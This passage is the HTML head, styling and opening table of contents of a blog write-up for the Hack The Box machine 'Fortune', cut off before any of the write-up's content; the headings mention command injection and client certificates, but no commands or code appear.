<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="generator" content="Hugo 0.99.1" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
<link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
<noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
<style>
button{overflow:visible}button,select{text-transform:none}button,html input[type="button"],input[type="reset"],input[type="submit"]{-webkit-appearance:button;cursor:pointer}button[disabled],html input[disabled]{cursor:default}
*{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}:before,:after{-webkit-box-sizing:border-box;-moz-box-sizing:border-box;box-sizing:border-box}
input,button,select,textarea{font-family:inherit;font-size:inherit;line-height:inherit}
.sr-only{position:absolute;width:1px;height:1px;margin:-1px;padding:0;overflow:hidden;clip:rect(0,0,0,0);border:0}.sr-only-focusable:active,.sr-only-focusable:focus{position:static;width:auto;height:auto;margin:0;overflow:visible;clip:auto}
[role="button"]{cursor: pointer;}
.container{margin-right:auto;margin-left:auto;padding-left:15px;padding-right:15px}@media (min-width: 768px){.container{width:750px}}@media (min-width: 992px){.container{width:970px}}@media (min-width: 1200px){.container{width:1170px}}.container-fluid{margin-right:auto;margin-left:auto;padding-left:15px;padding-right:15px}.row{margin-left:-15px;margin-right:-15px}
.col-xs-1, .col-sm-1, .col-md-1, .col-lg-1, .col-xs-2, .col-sm-2, .col-md-2, .col-lg-2, .col-xs-3, .col-sm-3, .col-md-3, .col-lg-3, .col-xs-4, .col-sm-4, .col-md-4, .col-lg-4, .col-xs-5, .col-sm-5, .col-md-5, .col-lg-5, .col-xs-6, .col-sm-6, .col-md-6, .col-lg-6, .col-xs-7, .col-sm-7, .col-md-7, .col-lg-7, .col-xs-8, .col-sm-8, .col-md-8, .col-lg-8, .col-xs-9, .col-sm-9, .col-md-9, .col-lg-9, .col-xs-10, .col-sm-10, .col-md-10, .col-lg-10, .col-xs-11, .col-sm-11, .col-md-11, .col-lg-11, .col-xs-12, .col-sm-12, .col-md-12, .col-lg-12 { position: relative; min-height: 1px; padding-left: 15px; padding-right: 15px; }
@media (min-width: 768px){.col-sm-1,.col-sm-2,.col-sm-3,.col-sm-4,.col-sm-5,.col-sm-6,.col-sm-7,.col-sm-8,.col-sm-9,.col-sm-10,.col-sm-11,.col-sm-12{float:left}.col-sm-12{width:100%}.col-sm-11{width:91.66666667%}.col-sm-10{width:83.33333333%}.col-sm-9{width:75%}.col-sm-8{width:66.66666667%}.col-sm-7{width:58.33333333%}.col-sm-6{width:50%}.col-sm-5{width:41.66666667%}.col-sm-4{width:33.33333333%}.col-sm-3{width:25%}.col-sm-2{width:16.66666667%}.col-sm-1{width:8.33333333%}.col-sm-pull-12{right:100%}.col-sm-pull-11{right:91.66666667%}.col-sm-pull-10{right:83.33333333%}.col-sm-pull-9{right:75%}.col-sm-pull-8{right:66.66666667%}.col-sm-pull-7{right:58.33333333%}.col-sm-pull-6{right:50%}.col-sm-pull-5{right:41.66666667%}.col-sm-pull-4{right:33.33333333%}.col-sm-pull-3{right:25%}.col-sm-pull-2{right:16.66666667%}.col-sm-pull-1{right:8.33333333%}.col-sm-pull-0{right:auto}.col-sm-push-12{left:100%}.col-sm-push-11{left:91.66666667%}.col-sm-push-10{left:83.33333333%}.col-sm-push-9{left:75%}.col-sm-push-8{left:66.66666667%}.col-sm-push-7{left:58.33333333%}.col-sm-push-6{left:50%}.col-sm-push-5{left:41.66666667%}.col-sm-push-4{left:33.33333333%}.col-sm-push-3{left:25%}.col-sm-push-2{left:16.66666667%}.col-sm-push-1{left:8.33333333%}.col-sm-push-0{left:auto}.col-sm-offset-12{margin-left:100%}.col-sm-offset-11{margin-left:91.66666667%}.col-sm-offset-10{margin-left:83.33333333%}.col-sm-offset-9{margin-left:75%}.col-sm-offset-8{margin-left:66.66666667%}.col-sm-offset-7{margin-left:58.33333333%}.col-sm-offset-6{margin-left:50%}.col-sm-offset-5{margin-left:41.66666667%}.col-sm-offset-4{margin-left:33.33333333%}.col-sm-offset-3{margin-left:25%}.col-sm-offset-2{margin-left:16.66666667%}.col-sm-offset-1{margin-left:8.33333333%}.col-sm-offset-0{margin-left:0}}@media (min-width: 992px){.col-md-1,.col-md-2,.col-md-3,.col-md-4,.col-md-5,.col-md-6,.col-md-7,.col-md-8,.col-md-9,.col-md-10,.col-md-11,.col-md-12{float:left}.col-md-12{width:100%}.col-md-11{width:91.66666667%}.col-md-10{width:83.33333333%}.col-md-9{width:75%}.col-md-8{width:66.66666667%}.col-md-7{width:58.33333333%}.col-md-6{width:50%}.col-md-5{width:41.66666667%}.col-md-4{width:33.33333333%}.col-md-3{width:25%}.col-md-2{width:16.66666667%}.col-md-1{width:8.33333333%}.col-md-pull-12{right:100%}.col-md-pull-11{right:91.66666667%}.col-md-pull-10{right:83.33333333%}.col-md-pull-9{right:75%}.col-md-pull-8{right:66.66666667%}.col-md-pull-7{right:58.33333333%}.col-md-pull-6{right:50%}.col-md-pull-5{right:41.66666667%}.col-md-pull-4{right:33.33333333%}.col-md-pull-3{right:25%}.col-md-pull-2{right:16.66666667%}.col-md-pull-1{right:8.33333333%}.col-md-pull-0{right:auto}.col-md-push-12{left:100%}.col-md-push-11{left:91.66666667%}.col-md-push-10{left:83.33333333%}.col-md-push-9{left:75%}.col-md-push-8{left:66.66666667%}.col-md-push-7{left:58.33333333%}.col-md-push-6{left:50%}.col-md-push-5{left:41.66666667%}.col-md-push-4{left:33.33333333%}.col-md-push-3{left:25%}.col-md-push-2{left:16.66666667%}.col-md-push-1{left:8.33333333%}.col-md-push-0{left:auto}.col-md-offset-12{margin-left:100%}.col-md-offset-11{margin-left:91.66666667%}.col-md-offset-10{margin-left:83.33333333%}.col-md-offset-9{margin-left:75%}.col-md-offset-8{margin-left:66.66666667%}.col-md-offset-7{margin-left:58.33333333%}.col-md-offset-6{margin-left:50%}.col-md-offset-5{margin-left:41.66666667%}.col-md-offset-4{margin-left:33.33333333%}.col-md-offset-3{margin-left:25%}.col-md-offset-2{margin-left:16.66666667%}.col-md-offset-1{margin-left:8.33333333%}.col-md-offset-0{margin-left:0}}
label { display: inline-block; max-width: 100%; margin-bottom: 5px; font-weight: bold; }
.btn{display:inline-block;margin-bottom:0;font-weight:400;text-align:center;vertical-align:middle;-ms-touch-action:manipulation;touch-action:manipulation;cursor:pointer;background-image:none;border:1px solid transparent;white-space:nowrap;padding:6px 12px;font-size:16px;line-height:1.4;border-radius:4px;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none}.btn:focus,.btn:active:focus,.btn.active:focus,.btn.focus,.btn:active.focus,.btn.active.focus{outline:5px auto -webkit-focus-ring-color;outline-offset:-2px}.btn:hover,.btn:focus,.btn.focus{color:#333;text-decoration:none}.btn:active,.btn.active{outline:0;background-image:none;-webkit-box-shadow:inset 0 3px 5px rgba(0,0,0,0.125);box-shadow:inset 0 3px 5px rgba(0,0,0,0.125)}.btn.disabled,.btn[disabled],fieldset[disabled] .btn{cursor:not-allowed;opacity:.65;filter:alpha(opacity=65);-webkit-box-shadow:none;box-shadow:none}a.btn.disabled,fieldset[disabled] a.btn{pointer-events:none}.btn-default{color:#333;background-color:#fff;border-color:#ccc}.btn-default:focus,.btn-default.focus{color:#333;background-color:#e6e6e6;border-color:#8c8c8c}.btn-default:hover{color:#333;background-color:#e6e6e6;border-color:#adadad}.btn-default:active,.btn-default.active,.open > .dropdown-toggle.btn-default{color:#333;background-color:#e6e6e6;border-color:#adadad}.btn-default:active:hover,.btn-default.active:hover,.open > .dropdown-toggle.btn-default:hover,.btn-default:active:focus,.btn-default.active:focus,.open > .dropdown-toggle.btn-default:focus,.btn-default:active.focus,.btn-default.active.focus,.open > .dropdown-toggle.btn-default.focus{color:#333;background-color:#d4d4d4;border-color:#8c8c8c}.btn-default:active,.btn-default.active,.open > .dropdown-toggle.btn-default{background-image:none}.btn-default.disabled:hover,.btn-default[disabled]:hover,fieldset[disabled] .btn-default:hover,.btn-default.disabled:focus,.btn-default[disabled]:focus,fieldset[disabled] .btn-default:focus,.btn-default.disabled.focus,.btn-default[disabled].focus,fieldset[disabled] .btn-default.focus{background-color:#fff;border-color:#ccc}.btn-default .badge{color:#fff;background-color:#333}.btn-primary{color:#fff;background-color:#195eff;border-color:#004cff}.btn-primary:focus,.btn-primary.focus{color:#fff;background-color:#0045e5;border-color:#00267f}.btn-primary:hover{color:#fff;background-color:#0045e5;border-color:#003ac1}.btn-primary:active,.btn-primary.active,.open > .dropdown-toggle.btn-primary{color:#fff;background-color:#0045e5;border-color:#003ac1}.btn-primary:active:hover,.btn-primary.active:hover,.open > .dropdown-toggle.btn-primary:hover,.btn-primary:active:focus,.btn-primary.active:focus,.open > .dropdown-toggle.btn-primary:focus,.btn-primary:active.focus,.btn-primary.active.focus,.open > .dropdown-toggle.btn-primary.focus{color:#fff;background-color:#003ac1;border-color:#00267f}.btn-primary:active,.btn-primary.active,.open > .dropdown-toggle.btn-primary{background-image:none}.btn-primary.disabled:hover,.btn-primary[disabled]:hover,fieldset[disabled] .btn-primary:hover,.btn-primary.disabled:focus,.btn-primary[disabled]:focus,fieldset[disabled] .btn-primary:focus,.btn-primary.disabled.focus,.btn-primary[disabled].focus,fieldset[disabled] .btn-primary.focus{background-color:#195eff;border-color:#004cff}.btn-primary .badge{color:#195eff;background-color:#fff}.btn-success{color:#fff;background-color:#00bc16;border-color:#00a313}.btn-success:focus,.btn-success.focus{color:#fff;background-color:#008910;border-color:#002304}.btn-success:hover{color:#fff;background-color:#008910;border-color:#00650c}.btn-success:active,.btn-success.active,.open > .dropdown-toggle.btn-success{color:#fff;background-color:#008910;border-color:#00650c}.btn-success:active:hover,.btn-success.active:hover,.open > .dropdown-toggle.btn-success:hover,.btn-success:active:focus,.btn-success.active:focus,.open > .dropdown-toggle.btn-success:focus,.btn-success:active.focus,.btn-success.active.focus,.open > .dropdown-toggle.btn-success.focus{color:#fff;background-color:#00650c;border-color:#002304}.btn-success:active,.btn-success.active,.open > .dropdown-toggle.btn-success{background-image:none}.btn-success.disabled:hover,.btn-success[disabled]:hover,fieldset[disabled] .btn-success:hover,.btn-success.disabled:focus,.btn-success[disabled]:focus,fieldset[disabled] .btn-success:focus,.btn-success.disabled.focus,.btn-success[disabled].focus,fieldset[disabled] .btn-success.focus{background-color:#00bc16;border-color:#00a313}.btn-success .badge{color:#00bc16;background-color:#fff}.btn-info{color:#fff;background-color:#5bc0de;border-color:#46b8da}.btn-info:focus,.btn-info.focus{color:#fff;background-color:#31b0d5;border-color:#1b6d85}.btn-info:hover{color:#fff;background-color:#31b0d5;border-color:#269abc}.btn-info:active,.btn-info.active,.open > .dropdown-toggle.btn-info{color:#fff;background-color:#31b0d5;border-color:#269abc}.btn-info:active:hover,.btn-info.active:hover,.open > .dropdown-toggle.btn-info:hover,.btn-info:active:focus,.btn-info.active:focus,.open > .dropdown-toggle.btn-info:focus,.btn-info:active.focus,.btn-info.active.focus,.open > .dropdown-toggle.btn-info.focus{color:#fff;background-color:#269abc;border-color:#1b6d85}.btn-info:active,.btn-info.active,.open > .dropdown-toggle.btn-info{background-image:none}.btn-info.disabled:hover,.btn-info[disabled]:hover,fieldset[disabled] .btn-info:hover,.btn-info.disabled:focus,.btn-info[disabled]:focus,fieldset[disabled] .btn-info:focus,.btn-info.disabled.focus,.btn-info[disabled].focus,fieldset[disabled] .btn-info.focus{background-color:#5bc0de;border-color:#46b8da}.btn-info .badge{color:#5bc0de;background-color:#fff}.btn-warning{color:#fff;background-color:#f0ad4e;border-color:#eea236}.btn-warning:focus,.btn-warning.focus{color:#fff;background-color:#ec971f;border-color:#985f0d}.btn-warning:hover{color:#fff;background-color:#ec971f;border-color:#d58512}.btn-warning:active,.btn-warning.active,.open > .dropdown-toggle.btn-warning{color:#fff;background-color:#ec971f;border-color:#d58512}.btn-warning:active:hover,.btn-warning.active:hover,.open > .dropdown-toggle.btn-warning:hover,.btn-warning:active:focus,.btn-warning.active:focus,.open > .dropdown-toggle.btn-warning:focus,.btn-warning:active.focus,.btn-warning.active.focus,.open > .dropdown-toggle.btn-warning.focus{color:#fff;background-color:#d58512;border-color:#985f0d}.btn-warning:active,.btn-warning.active,.open > .dropdown-toggle.btn-warning{background-image:none}.btn-warning.disabled:hover,.btn-warning[disabled]:hover,fieldset[disabled] .btn-warning:hover,.btn-warning.disabled:focus,.btn-warning[disabled]:focus,fieldset[disabled] .btn-warning:focus,.btn-warning.disabled.focus,.btn-warning[disabled].focus,fieldset[disabled] .btn-warning.focus{background-color:#f0ad4e;border-color:#eea236}.btn-warning .badge{color:#f0ad4e;background-color:#fff}.btn-danger{color:#fff;background-color:#d9534f;border-color:#d43f3a}.btn-danger:focus,.btn-danger.focus{color:#fff;background-color:#c9302c;border-color:#761c19}.btn-danger:hover{color:#fff;background-color:#c9302c;border-color:#ac2925}.btn-danger:active,.btn-danger.active,.open > .dropdown-toggle.btn-danger{color:#fff;background-color:#c9302c;border-color:#ac2925}.btn-danger:active:hover,.btn-danger.active:hover,.open > .dropdown-toggle.btn-danger:hover,.btn-danger:active:focus,.btn-danger.active:focus,.open > .dropdown-toggle.btn-danger:focus,.btn-danger:active.focus,.btn-danger.active.focus,.open > .dropdown-toggle.btn-danger.focus{color:#fff;background-color:#ac2925;border-color:#761c19}.btn-danger:active,.btn-danger.active,.open > .dropdown-toggle.btn-danger{background-image:none}.btn-danger.disabled:hover,.btn-danger[disabled]:hover,fieldset[disabled] .btn-danger:hover,.btn-danger.disabled:focus,.btn-danger[disabled]:focus,fieldset[disabled] .btn-danger:focus,.btn-danger.disabled.focus,.btn-danger[disabled].focus,fieldset[disabled] .btn-danger.focus{background-color:#d9534f;border-color:#d43f3a}.btn-danger .badge{color:#d9534f;background-color:#fff}.btn-link{color:#000;font-weight:400;border-radius:0}.btn-link,.btn-link:active,.btn-link.active,.btn-link[disabled],fieldset[disabled] .btn-link{background-color:transparent;-webkit-box-shadow:none;box-shadow:none}.btn-link,.btn-link:hover,.btn-link:focus,.btn-link:active{border-color:transparent}.btn-link:hover,.btn-link:focus{color:#000;text-decoration:none;background-color:transparent}.btn-link[disabled]:hover,fieldset[disabled] .btn-link:hover,.btn-link[disabled]:focus,fieldset[disabled] .btn-link:focus{color:#777;text-decoration:none}.btn-lg{padding:10px 16px;font-size:20px;line-height:1.3333333;border-radius:6px}.btn-sm{padding:5px 10px;font-size:14px;line-height:1.5;border-radius:3px}.btn-xs{padding:1px 5px;font-size:14px;line-height:1.5;border-radius:3px}.btn-block{display:block;width:100%}.btn-block + .btn-block{margin-top:5px}
.dropup,.dropdown{position:relative}.dropdown-toggle:focus{outline:0}.dropdown-menu{position:absolute;top:100%;left:0;z-index:1000;display:none;float:left;min-width:160px;padding:5px 0;margin:2px 0 0;list-style:none;font-size:16px;text-align:left;background-color:#fff;border:1px solid #ccc;border:1px solid rgba(0,0,0,0.15);border-radius:4px;-webkit-box-shadow:0 6px 12px rgba(0,0,0,0.175);box-shadow:0 6px 12px rgba(0,0,0,0.175);-webkit-background-clip:padding-box;background-clip:padding-box}.dropdown-menu.pull-right{right:0;left:auto}.dropdown-menu .divider{height:1px;margin:10px 0;overflow:hidden;background-color:#e5e5e5}.dropdown-menu > li > a{display:block;padding:3px 10px;clear:both;font-weight:400;line-height:1.4;color:#333;white-space:nowrap}.dropdown-menu > li > a:hover,.dropdown-menu > li > a:focus{text-decoration:none;color:#262626;background-color:#f5f5f5}.dropdown-menu > .active > a,.dropdown-menu > .active > a:hover,.dropdown-menu > .active > a:focus{color:#fff;text-decoration:none;outline:0;background-color:#195eff}.dropdown-menu > .disabled > a,.dropdown-menu > .disabled > a:hover,.dropdown-menu > .disabled > a:focus{color:#777}.dropdown-menu > .disabled > a:hover,.dropdown-menu > .disabled > a:focus{text-decoration:none;background-color:transparent;background-image:none;filter:progid:DXImageTransform.Microsoft.gradient(enabled = false);cursor:not-allowed}.open > .dropdown-menu{display:block}.open > a{outline:0}.dropdown-menu-right{left:auto;right:0}.dropdown-menu-left{left:0;right:auto}.dropdown-header{display:block;padding:3px 10px;font-size:14px;line-height:1.4;color:#777;white-space:nowrap}.dropdown-backdrop{position:fixed;left:0;right:0;bottom:0;top:0;z-index:990}.pull-right > .dropdown-menu{right:0;left:auto}.dropup .caret,.navbar-fixed-bottom .dropdown .caret{border-top:0;border-bottom:4px dashed;border-bottom:4px solid \9;content:""}.dropup .dropdown-menu,.navbar-fixed-bottom .dropdown .dropdown-menu{top:auto;bottom:100%;margin-bottom:2px}
.nav{margin-bottom:0;padding-left:0;list-style:none}.nav > li{position:relative;display:block}.nav > li > a{position:relative;display:block;padding:5px 10px}.nav > li > a:hover,.nav > li > a:focus{text-decoration:none;background-color:#a52a2a}.nav > li.disabled > a{color:#777}.nav > li.disabled > a:hover,.nav > li.disabled > a:focus{color:#777;text-decoration:none;background-color:transparent;cursor:not-allowed}.nav .open > a,.nav .open > a:hover,.nav .open > a:focus{background-color:#a52a2a;border-color:#000}.nav .nav-divider{height:1px;margin:10px 0;overflow:hidden;background-color:#e5e5e5}.nav > li > a > img{max-width:none}.nav-pills > li{float:left}.nav-pills > li > a{border-radius:4px}.nav-pills > li + li{margin-left:2px}.nav-pills > li.active > a,.nav-pills > li.active > a:hover,.nav-pills > li.active > a:focus{color:#fff;background-color:#195eff}.nav-stacked > li{float:none}.nav-stacked > li + li{margin-top:0px;margin-left:0}.navbar{position:relative;min-height:48px;max-height:48px;margin-bottom:22px;border:1px solid transparent}@media (min-width: 768px){.navbar{border-radius:4px}}@media (max-device-width: 480px) and (orientation: landscape){.navbar-fixed-top .navbar-collapse,.navbar-fixed-bottom .navbar-collapse{max-height:200px}}.navbar-static-top{z-index:1000;border-width:0 0 1px}@media (min-width: 768px){.navbar-static-top{border-radius:0}}.navbar-fixed-top,.navbar-fixed-bottom{position:fixed;right:0;left:0;z-index:1030}@media (min-width: 768px){.navbar-fixed-top,.navbar-fixed-bottom{border-radius:0}}.navbar-fixed-top{top:0;border-width:0 0 1px}.navbar-fixed-bottom{bottom:0;margin-bottom:0;border-width:1px 0 0}@media (min-width: 768px){.navbar > .container .navbar-brand,.navbar > .container-fluid .navbar-brand{margin-left:-15px}}.navbar-fixed-bottom .navbar-nav > li > .dropdown-menu{margin-bottom:0;border-top-right-radius:4px;border-top-left-radius:4px;border-bottom-right-radius:0;border-bottom-left-radius:0}.navbar-default{background-color:#7d1935;border-color:#611329}.navbar-default .navbar-nav > li > a{color:#fff}.navbar-default .navbar-nav > li > a:hover,.navbar-default .navbar-nav > li > a:focus{color:#fff;background-color:#a52a2a}.navbar-default .navbar-nav > .active > a,.navbar-default .navbar-nav > .active > a:hover,.navbar-default .navbar-nav > .active > a:focus{color:#fff;background-color:#611329}.navbar-default .navbar-nav > .disabled > a,.navbar-default .navbar-nav > .disabled > a:hover,.navbar-default .navbar-nav > .disabled > a:focus{color:#ccc;background-color:transparent}.navbar-default .navbar-toggle{border-color:#a52a2a}.navbar-default .navbar-toggle:hover,.navbar-default .navbar-toggle:focus{background-color:#a52a2a}.navbar-default .navbar-toggle .icon-bar{background-color:#888}.navbar-default .navbar-collapse,.navbar-default .navbar-form{border-color:#611329}.navbar-default .navbar-nav > .open > a,.navbar-default .navbar-nav > .open > a:hover,.navbar-default .navbar-nav > .open > a:focus{background-color:#611329;color:#fff}@media (max-width: 767px){.navbar-default .navbar-nav .open .dropdown-menu > li > a{color:#fff}.navbar-default .navbar-nav .open .dropdown-menu > li > a:hover,.navbar-default .navbar-nav .open .dropdown-menu > li > a:focus{color:#fff;background-color:#a52a2a}.navbar-default .navbar-nav .open .dropdown-menu > .active > a,.navbar-default .navbar-nav .open .dropdown-menu > .active > a:hover,.navbar-default .navbar-nav .open .dropdown-menu > .active > a:focus{color:#fff;background-color:#611329}.navbar-default .navbar-nav .open .dropdown-menu > .disabled > a,.navbar-default .navbar-nav .open .dropdown-menu > .disabled > a:hover,.navbar-default .navbar-nav .open .dropdown-menu > .disabled > a:focus{color:#ccc;background-color:transparent}}.navbar-default .navbar-link{color:#fff}.navbar-default .navbar-link:hover{color:#fff}.navbar-default .btn-link{color:#fff}.navbar-default .btn-link:hover,.navbar-default .btn-link:focus{color:#fff}
.label{display:inline;padding:.2em .6em .3em;font-size:75%;font-weight:700;line-height:1;color:#fff;text-align:center;white-space:nowrap;vertical-align:baseline;border-radius:.25em}a.label:hover,a.label:focus{color:#fff;text-decoration:none;cursor:pointer}.label:empty{display:none}.btn .label{position:relative;top:-1px}.label-default{background-color:#777}.label-default[href]:hover,.label-default[href]:focus{background-color:#5e5e5e}.label-primary{background-color:#195eff}.label-primary[href]:hover,.label-primary[href]:focus{background-color:#0045e5}.label-success{background-color:#00bc16}.label-success[href]:hover,.label-success[href]:focus{background-color:#008910}.label-info{background-color:#5bc0de}.label-info[href]:hover,.label-info[href]:focus{background-color:#31b0d5}.label-warning{background-color:#f0ad4e}.label-warning[href]:hover,.label-warning[href]:focus{background-color:#ec971f}.label-danger{background-color:#d9534f}.label-danger[href]:hover,.label-danger[href]:focus{background-color:#c9302c}.badge{display:inline-block;min-width:10px;padding:3px 7px;font-size:14px;font-weight:700;color:#fff;line-height:1;vertical-align:middle;white-space:nowrap;text-align:center;background-color:#000;border-radius:10px}.badge:empty{display:none}.btn .badge{position:relative;top:-1px}.btn-xs .badge,.btn-group-xs > .btn .badge{top:0;padding:1px 5px}a.badge:hover,a.badge:focus{color:#fff;text-decoration:none;cursor:pointer}
.nav-pills > .active > a > .badge{color:#000;background-color:#fff}.nav-pills > li > a > .badge{margin-left:3px}
.clearfix:before,.clearfix:after,.container:before,.container:after,.container-fluid:before,.container-fluid:after,.row:before,.row:after,.form-horizontal .form-group:before,.form-horizontal .form-group:after,.nav:before,.nav:after,.navbar:before,.navbar:after,.navbar-header:before,.navbar-header:after,.navbar-collapse:before,.navbar-collapse:after{content:" ";display:table}.clearfix:after,.container:after,.container-fluid:after,.row:after,.form-horizontal .form-group:after,.nav:after,.navbar:after,.navbar-header:after,.navbar-collapse:after{clear:both}
.pull-right { float: right !important; } .pull-left { float: left !important; }

 
html { font-size:16px; }
body:not(.en) :lang(en), body:not(.el) :lang(el), body:not(.fr) :lang(fr) { display: none; }
body {
  font-size: 16px; line-height: 1.45; color: #000000;  background-color: #eceff1;
  margin: 0; padding-top: 70px; 
  font-family: 'Open Sans', 'Times New Roman', sans-serif;
  -webkit-animation: bugfix infinite 1s;
}
@-webkit-keyframes bugfix { from { fill: 0; } to { fill: 0; } }

a { color: #000; word-wrap: break-word; text-decoration: none; }
a:hover, a:focus, a:active { color: black; text-decoration: none; }
a.label { box-shadow: 2px 3px 4px 0px rgba(0,0,0,0.75); }
figure {  display: table; margin: 10px auto; }
figure figcaption { caption-side: bottom; color: darkblue; display: table-caption;
font-size: 14px; margin-top: 5px; text-align:justify; }
h1, h2, h3, h4, h5, h6 { margin:0px; text-align: justify; }
img { max-width: 100%; }
img.bordered { border:1px solid #021a40;  border-radius:20px; box-shadow: 2px 3px 4px 0px rgba(0,0,0,0.75); }
li { line-height: 1.5rem; text-align:justify; }
p { text-align:justify; text-indent: 30px; }
section { margin-top: 1rem; margin-bottom: 1rem; }
section>header { margin-bottom: .3rem; }
ul, ol { padding-left: 1.5rem; }

article .image { background-size: cover; background-position: center; }
article time { font-size: .8rem; }
article.grid { max-width:384px; margin-bottom:0.5rem; height:26rem; overflow: hidden; }
article.grid .image { min-height: 12rem; }
article.grid footer { padding: 1rem; background-color: #ffffe6; }
article.grid .title { overflow: hidden; }
article.grid .summary { color: #333; font-size: .8rem; line-height: 1rem; max-height: 5rem; overflow: hidden; }
article.single { background-color: #fff; margin: 0 auto; padding-bottom: 1rem; max-width:1200px; }
article.single .image { max-width:786px; min-height: 24rem; margin-left:auto; margin-right:auto; }
article.single .body { margin-bottom: 2rem;  padding: 0 5rem; }
article.single .body a:not(.label) { color: #78909c; text-decoration: underline; }
article.single .body>h1, article.single .body>h2, article.single .body>h3 { padding-top: 60px; margin-top: -30px; margin-bottom: 0.5rem; }
article.single .body li {  margin: 0.5rem auto; }
article.li { margin-bottom: .5rem; font-size: .8rem; line-height: 1rem; }
article.li .cell { display:table-cell; vertical-align: middle; }
article.li .image { width: 4.1rem; height: 4.1rem; box-shadow: 2px 3px 4px 0px rgba(0,0,0,0.75); }
article.li footer { display:table-cell; vertical-align: middle; padding-left: .5rem;  }
article.li time { font-size: .7rem; }
article.li .title { font-size: 0.85rem; line-height: 1rem; font-weight: 700; }

.body .title { font-size: 2rem; line-height: 3rem; margin: 0.5rem auto; }
.label { display:inline-block; padding-top: 0.25rem; }

.navbar * { color: white !important; }
.navbar .dropdown-menu a:hover { background-color: brown; }
.nav>li>a:hover, .nav>li>a:focus { color: white; background-color: brown; }
.nav-pills { display: inline-block; margin: 0; }
.nav-pills>li.active>a { font-weight: 700 !important; background-color: #00bc16 !important; }
.nav-pills>li.active>a .badge { color: #00bc16; }
.cssdropdown { margin-top: 2rem; }
.cssdropdown input[type=checkbox], .cssdropdown ul { display: none; }
.cssdropdown label { font-size: 1.25rem; font-weight:700; min-width: 300px; }
.cssdropdown input[type=checkbox]:checked ~ ul { display: table-cell; }

.p-logo {
  font-family: 'Comic Sans MS', cursive; font-weight: bold; font-size: 2rem;
  text-shadow: 4px 2px 2px rgba(0,0,0,0.75);
  margin-top: 3px;
}
.l-footer * { color: white; }
.l-footer { background-color: #7D1935; padding: 0.75rem 0; text-align: center; }

.lgfont { font-size: 2rem; }
.margin-sm { margin: 0.5rem; }
.side-margins-1 { margin-left: 1rem !important; margin-right: 1rem !important; }
.side-margins-2 { margin-left: 2rem !important;; margin-right: 2rem !important; }
.margin-top-sm {  margin-top: 0.5rem; }
.topmargin5 {  margin-top: 5px; }
.topmargin7 { margin-top: 7px; }

#search-section, #results-section { display:none; }
#TableOfContents ul { list-style: none; }
#TableOfContents>ul {  padding-left: 0; font-weight: 700; }
#TableOfContents>ul ul { font-weight: normal; }

.summary { text-align:justify; }
.max-width640 { max-width: 640px; }
.floatleft { float:left; margin-right: 10px; }
.floatright { float:right; margin-left: 10px; }

.centered { margin-left: auto !important;  margin-right: auto !important; }
img.centered { display:block !important; }
div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.centered, h2.centered, h3.centered { text-align:center !important; }

@media (max-width: 768px) {
  h1 { font-size: 1.4rem; line-height: 1.5rem; }
  h2 { font-size: 1.2rem; line-height: 1.5rem; }
  article.single .image { min-height: 12rem; }
  article.single .body pre { margin: 1rem -1rem; }
  article.single .body pre code { padding: 1rem 1rem; }
  article.single .body { padding: 0 1rem; }
  ul.scroll-menu { max-height: 250px; }
  .cssdropdown label, .nav-stacked>li>a { min-width: 240px; }
  .hidden768 { display:none; }
  .text-smaller {
    font-family: 'Open Sans', 'Times New Roman', sans-serif;
    font-size: 1rem;  font-weight: 700; letter-spacing: -1px;
    padding-left: 0px !important;  padding-right: 0px !important;
    line-height:32px;
  }
}
</style>
<link rel="alternate" type="application/rss+xml" title="RSS" href="https://alamot.github.io/index.xml">

  <link href="https://alamot.github.io/index.xml" rel="alternate" type="application/rss+xml" title="The Portal of Knowledge" />


  <title>Fortune (Hack The Box) write-up - The Portal of Knowledge</title>
  <meta property='og:title' content="Fortune (Hack The Box) write-up - The Portal of Knowledge">
  <meta property="og:type" content="article">
  <meta name="description" content="Write-up for the Fortune machine. Ανάλυση του μηχανήματος Fortune (διαθέσιμη μόνο στα αγγλικά).">
  <meta property="og:description" content="Write-up for the Fortune machine. Ανάλυση του μηχανήματος Fortune (διαθέσιμη μόνο στα αγγλικά).">
  <meta property="og:image" content="https://alamot.github.io/images/fortune.jpg">
  <meta property="og:image:width" content="768" />
  <meta property="og:image:height" content="384" />

<meta property="og:url" content="https://alamot.github.io/fortune_writeup/">


<script type="application/ld+json">
  {
    "@context": "http://schema.org",
    "@type": "BlogPosting",
    "mainEntityOfPage":{
      "@type":"WebPage",
      "@id":"https:\/\/alamot.github.io\/"
    },
    "headline": "Fortune (Hack The Box) write-up |  ",
    "image": {
      "@type": "ImageObject",
      "url": "",
      "height": 700,
      "width": 700
    },
    "datePublished": "2019-08-02T00:00:00JST",
    "dateModified": "2019-08-02T00:00:00JST",
    "author": {
      "@type": "Person",
      "name": "Antonios Tsolis",
      "image": "https:\/\/alamot.github.io\/images/logo.png"
    },
    "publisher": {
      "@type": "Organization",
      "name": "",
      "logo": {
        "@type": "ImageObject",
        "url": "https:\/\/alamot.github.io\/images/logo.png",
        "height": 60,
        "width": 60
      }
    },
    "description": ""
  }
</script>
</head>
<body id="mainbody" class="en" lang="en">
<nav class="navbar navbar-default navbar-fixed-top centered">
<div class="container-fluid">
  
   <ul class="nav nav-pills pull-left topmargin7">
    <li id="content-selector" role="presentation" class="dropdown">
    <a class="dropdown-toggle btn-danger" data-toggle="dropdown" href="#" role="button" aria-haspopup="true" aria-expanded="false"><span lang="en">Contents</span><span lang="el">Περιεχόμενα</span> <i class="fa fa-caret-down" aria-hidden="true"></i></a>
      <ul class="dropdown-menu scroll-menu">
        <li><a href="#title"><span lang="en">Start</span><span lang="el">Αρχή</span></a></li>
        
        
        
         
<li><a href="#introduction">Introduction</a></li>
<li><a href="#enumeration">Enumeration</a>
<ul>
<li><a href="#port-scanning">Port scanning</a></li>
<li><a href="#port-80">Port 80</a></li>
<li><a href="#port-443">Port 443</a></li>
</ul></li>
<li><a href="#exploitation">Exploitation</a>
<ul>
<li><a href="#gaining-rce-due-to-command-injection">Gaining RCE due to command Injection</a></li>
<li><a href="#acquiring-a-client-certificate">Acquiring a client certificate</a></li>
<li><a href="#ssh-authentication-to-authpf">SSH authentication to authpf</a></li>
